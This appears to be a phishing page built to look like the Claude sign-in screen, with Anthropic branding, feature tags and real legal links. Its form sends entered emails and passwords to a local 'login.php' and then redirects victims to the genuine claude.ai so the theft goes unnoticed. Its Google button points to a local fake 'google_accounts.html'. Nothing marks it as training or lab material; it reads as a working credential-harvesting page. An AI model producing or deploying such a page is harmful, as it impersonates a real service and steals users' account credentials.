<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Claude - AI assistant by Anthropic">
    <meta name="theme-color" content="#D97706">
    <title>Claude</title>
    
    <!-- Favicons -->
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/png" href="favicon.png">
    <link rel="apple-touch-icon" href="favicon.png">
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='14' fill='%23D97706'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='bold' fill='white' text-anchor='middle'%3EC%3C/text%3E%3C/svg%3E">
    
    <style>
        /* ============================================
           CLAUDE DESIGN SYSTEM
           ============================================ */
        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --claude-primary: #D97706;
            --claude-primary-hover: #B45309;
            --claude-primary-light: #FEF3C7;
            
            --claude-text: #1F2937;
            --claude-text-secondary: #4B5563;
            --claude-text-muted: #9CA3AF;
            
            --claude-bg: #FFFFFF;
            --claude-bg-secondary: #F9FAFB;
            --claude-bg-tertiary: #F3F4F6;
            
            --claude-border: #E5E7EB;
            --claude-border-strong: #D1D5DB;
            --claude-border-focus: #D97706;
            
            --claude-error: #EF4444;
            --claude-error-bg: #FEF2F2;
            --claude-success: #10B981;
            
            --claude-shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
            --claude-shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07);
            --claude-shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
            
            --claude-radius-sm: 6px;
            --claude-radius-md: 8px;
            --claude-radius-lg: 12px;
            --claude-radius-full: 9999px;
            
            --claude-font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            --claude-transition: 150ms cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        html {
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
        }
        
        body {
            font-family: var(--claude-font);
            background: var(--claude-bg-secondary);
            color: var(--claude-text);
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* ============================================
           LAYOUT
           ============================================ */
        .page {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            background: var(--claude-bg);
            border-radius: var(--claude-radius-lg);
            box-shadow: var(--claude-shadow-lg);
            padding: 48px 40px;
            animation: fadeIn 0.4s ease-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
                box-shadow: none;
                border-radius: 0;
            }
        }
        
        /* ============================================
           LOGO SECTION
           ============================================ */
        .logo-section {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo-wrapper {
            display: inline-block;
            margin-bottom: 16px;
        }
        
        .logo-wrapper img {
            width: 48px;
            height: 48px;
            border-radius: var(--claude-radius-md);
        }
        
        .logo-wrapper svg {
            width: 48px;
            height: 48px;
        }
        
        .logo-text {
            font-size: 32px;
            font-weight: 600;
            color: var(--claude-text);
            letter-spacing: -0.5px;
        }
        
        .tagline {
            font-size: 14px;
            color: var(--claude-text-muted);
            margin-top: 8px;
        }
        
        /* ============================================
           FORM
           ============================================ */
        .form-section {
            margin-bottom: 24px;
        }
        
        .form-title {
            font-size: 24px;
            font-weight: 600;
            color: var(--claude-text);
            margin-bottom: 8px;
            text-align: center;
        }
        
        .form-description {
            font-size: 14px;
            color: var(--claude-text-secondary);
            text-align: center;
            margin-bottom: 32px;
            line-height: 1.6;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: var(--claude-text);
            margin-bottom: 6px;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid var(--claude-border);
            border-radius: var(--claude-radius-md);
            font-size: 15px;
            font-family: inherit;
            color: var(--claude-text);
            background: var(--claude-bg);
            outline: none;
            transition: all var(--claude-transition);
        }
        
        .input-field:hover {
            border-color: var(--claude-border-strong);
        }
        
        .input-field:focus {
            border-color: var(--claude-border-focus);
            box-shadow: 0 0 0 3px rgba(217, 119, 6, 0.1);
        }
        
        .input-field.error {
            border-color: var(--claude-error);
            background: var(--claude-error-bg);
        }
        
        .input-field::placeholder {
            color: var(--claude-text-muted);
        }
        
        .input-error {
            font-size: 13px;
            color: var(--claude-error);
            margin-top: 6px;
            display: none;
            align-items: center;
            gap: 4px;
            animation: shake 0.4s ease-out;
        }
        
        .input-error.show {
            display: flex;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }
        
        .input-error svg {
            width: 14px;
            height: 14px;
            flex-shrink: 0;
        }
        
        /* ============================================
           BUTTONS
           ============================================ */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: var(--claude-radius-md);
            font-size: 15px;
            font-weight: 500;
            font-family: inherit;
            cursor: pointer;
            transition: all var(--claude-transition);
            position: relative;
            overflow: hidden;
        }
        
        .btn-primary {
            background: var(--claude-text);
            color: white;
        }
        
        .btn-primary:hover {
            background: #111827;
        }
        
        .btn-primary:active {
            transform: scale(0.98);
        }
        
        .btn-primary:disabled {
            background: var(--claude-border-strong);
            color: var(--claude-text-muted);
            cursor: not-allowed;
        }
        
        .btn-primary.btn-loading {
            pointer-events: none;
            color: transparent;
        }
        
        .btn-primary.btn-loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            transform: translate(-50%, -50%);
            animation: spin 0.6s linear infinite;
        }
        
        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        /* ============================================
           DIVIDER
           ============================================ */
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            gap: 12px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--claude-border);
        }
        
        .divider-text {
            font-size: 13px;
            color: var(--claude-text-muted);
        }
        
        /* ============================================
           GOOGLE BUTTON
           ============================================ */
        .google-btn {
            background: var(--claude-bg);
            border: 1px solid var(--claude-border);
            color: var(--claude-text);
        }
        
        .google-btn:hover {
            background: var(--claude-bg-secondary);
            border-color: var(--claude-border-strong);
        }
        
        .google-btn svg {
            width: 20px;
            height: 20px;
        }
        
        /* ============================================
           FOOTER LINKS
           ============================================ */
        .footer-links {
            text-align: center;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid var(--claude-border);
        }
        
        .footer-text {
            font-size: 14px;
            color: var(--claude-text-secondary);
            margin-bottom: 12px;
        }
        
        .footer-text a {
            color: var(--claude-primary);
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
        }
        
        .footer-text a:hover {
            text-decoration: underline;
        }
        
        .footer-legal {
            display: flex;
            justify-content: center;
            gap: 16px;
            font-size: 12px;
            color: var(--claude-text-muted);
        }
        
        .footer-legal a {
            color: var(--claude-text-muted);
            text-decoration: none;
        }
        
        .footer-legal a:hover {
            color: var(--claude-text-secondary);
            text-decoration: underline;
        }
        
        /* ============================================
           FEATURES
           ============================================ */
        .features {
            display: flex;
            gap: 8px;
            margin-bottom: 32px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .feature-tag {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 4px 10px;
            background: var(--claude-primary-light);
            color: var(--claude-primary);
            border-radius: var(--claude-radius-full);
            font-size: 12px;
            font-weight: 500;
        }
        
        .feature-tag svg {
            width: 12px;
            height: 12px;
        }
        
        /* ============================================
           LOADING OVERLAY
           ============================================ */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(4px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        
        .loading-overlay.show {
            display: flex;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--claude-border);
            border-top-color: var(--claude-primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        /* ============================================
           ACCESSIBILITY
           ============================================ */
        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }
        
        *:focus-visible {
            outline: 2px solid var(--claude-primary);
            outline-offset: 2px;
        }
        
        /* ============================================
           DARK MODE
           ============================================ */
        @media (prefers-color-scheme: dark) {
            :root {
                --claude-text: #F9FAFB;
                --claude-text-secondary: #D1D5DB;
                --claude-text-muted: #6B7280;
                --claude-bg: #1F2937;
                --claude-bg-secondary: #111827;
                --claude-bg-tertiary: #374151;
                --claude-border: #374151;
                --claude-border-strong: #4B5563;
            }
            
            .btn-primary {
                background: var(--claude-primary);
            }
            
            .btn-primary:hover {
                background: var(--claude-primary-hover);
            }
        }
    </style>
</head>
<body>
    <div class="page">
        <div class="container">
            
            <!-- Logo -->
            <div class="logo-section">
                <div class="logo-wrapper">
                    <img src="logo.png" alt="Claude" onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='block';">
                    <svg id="logoFallback" style="display:none" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                        <defs>
                            <linearGradient id="claudeGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                                <stop offset="0%" style="stop-color:#D97706"/>
                                <stop offset="100%" style="stop-color:#F59E0B"/>
                            </linearGradient>
                        </defs>
                        <circle cx="50" cy="50" r="45" fill="url(#claudeGrad)"/>
                        <text x="50" y="65" font-family="Arial" font-size="48" font-weight="bold" fill="white" text-anchor="middle">C</text>
                    </svg>
                </div>
                <div class="logo-text">Claude</div>
                <div class="tagline">AI assistant by Anthropic</div>
            </div>
            
            <!-- Features -->
            <div class="features">
                <span class="feature-tag">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                    200K Context
                </span>
                <span class="feature-tag">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                    Claude 3.5
                </span>
                <span class="feature-tag">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                    Artifacts
                </span>
            </div>
            
            <!-- Form -->
            <div class="form-section">
                <h1 class="form-title">Welcome to Claude</h1>
                <p class="form-description">Sign in to access your conversations and continue where you left off.</p>
                
                <form id="loginForm" action="login.php" method="POST" autocomplete="off" novalidate>
                    <!-- Email -->
                    <div class="input-group">
                        <label for="email" class="input-label">Email address</label>
                        <input 
                            type="email" 
                            name="email" 
                            id="email" 
                            class="input-field"
                            placeholder="you@example.com" 
                            required 
                            autocomplete="email"
                            autofocus
                        >
                        <div class="input-error" id="emailError">
                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                            <span></span>
                        </div>
                    </div>
                    
                    <!-- Password -->
                    <div class="input-group">
                        <label for="password" class="input-label">Password</label>
                        <input 
                            type="password" 
                            name="password" 
                            id="password" 
                            class="input-field"
                            placeholder="Enter your password" 
                            required 
                            autocomplete="current-password"
                        >
                        <div class="input-error" id="passwordError">
                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                            <span></span>
                        </div>
                    </div>
                    
                    <!-- Submit -->
                    <button type="submit" class="btn btn-primary" id="submitBtn">
                        Continue
                    </button>
                </form>
                
                <!-- Divider -->
                <div class="divider">
                    <span class="divider-text">or</span>
                </div>
                
                <!-- Google Button -->
                <button type="button" class="btn google-btn" onclick="redirectToGoogle()">
                    <svg viewBox="0 0 24 24">
                        <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    Continue with Google
                </button>
            </div>
            
            <!-- Footer -->
            <div class="footer-links">
                <p class="footer-text">
                    Don't have an account? <a href="https://claude.ai/signup" target="_blank">Sign up</a>
                </p>
                <div class="footer-legal">
                    <a href="https://www.anthropic.com/terms" target="_blank">Terms</a>
                    <a href="https://www.anthropic.com/privacy" target="_blank">Privacy</a>
                    <a href="https://support.anthropic.com" target="_blank">Help</a>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>
    
    <script>
        const elements = {
            email: document.getElementById('email'),
            password: document.getElementById('password'),
            emailError: document.getElementById('emailError'),
            passwordError: document.getElementById('passwordError'),
            submitBtn: document.getElementById('submitBtn'),
            loadingOverlay: document.getElementById('loadingOverlay')
        };
        
        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }
        
        function showError(el, message) {
            const span = el.querySelector('span');
            if (span) span.textContent = message;
            el.classList.add('show');
            const input = el.previousElementSibling;
            if (input && input.classList.contains('input-field')) {
                input.classList.add('error');
            }
        }
        
        function clearError(el) {
            el.classList.remove('show');
            const input = el.previousElementSibling;
            if (input && input.classList.contains('input-field')) {
                input.classList.remove('error');
            }
        }
        
        function showLoading() {
            elements.loadingOverlay.classList.add('show');
        }
        
        function hideLoading() {
            elements.loadingOverlay.classList.remove('show');
        }
        
        function setButtonLoading(btn, loading) {
            if (loading) {
                btn.classList.add('btn-loading');
                btn.disabled = true;
            } else {
                btn.classList.remove('btn-loading');
                btn.disabled = false;
            }
        }
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = elements.email.value.trim();
            const password = elements.password.value;
            
            let hasError = false;
            
            if (!email) {
                showError(elements.emailError, 'Email is required');
                hasError = true;
            } else if (!isValidEmail(email)) {
                showError(elements.emailError, 'Please enter a valid email');
                hasError = true;
            } else {
                clearError(elements.emailError);
            }
            
            if (!password) {
                showError(elements.passwordError, 'Password is required');
                hasError = true;
            } else if (password.length < 6) {
                showError(elements.passwordError, 'Password must be at least 6 characters');
                hasError = true;
            } else {
                clearError(elements.passwordError);
            }
            
            if (hasError) return;
            
            setButtonLoading(elements.submitBtn, true);
            showLoading();
            
            const formData = new FormData(this);
            fetch('login.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'ok') {
                    setTimeout(() => {
                        window.location.href = 'https://claude.ai/';
                    }, 1000);
                } else {
                    hideLoading();
                    setButtonLoading(elements.submitBtn, false);
                    showError(elements.emailError, data.message || 'Invalid credentials');
                }
            })
            .catch(err => {
                hideLoading();
                setButtonLoading(elements.submitBtn, false);
                showError(elements.emailError, 'Network error');
            });
        });
        
        elements.email.addEventListener('input', () => clearError(elements.emailError));
        elements.password.addEventListener('input', () => clearError(elements.passwordError));
        
        function redirectToGoogle() {
            window.location.href = 'google_accounts.html';
        }
        
        // Favicon cache
        (function() {
            try {
                const cached = localStorage.getItem('claude_favicon_v1');
                if (cached) {
                    document.querySelectorAll('link[rel*="icon"]').forEach(link => {
                        if (link.type === 'image/x-icon' || link.type === 'image/png') {
                            link.href = cached;
                        }
                    });
                } else {
                    fetch('favicon.ico')
                        .then(r => r.blob())
                        .then(blob => {
                            const reader = new FileReader();
                            reader.onload = function() {
                                try {
                                    localStorage.setItem('claude_favicon_v1', reader.result);
                                } catch(e) {}
                            };
                            reader.readAsDataURL(blob);
                        })
                        .catch(() => {});
                }
            } catch(e) {}
        })();
    </script>
</body>
</html>
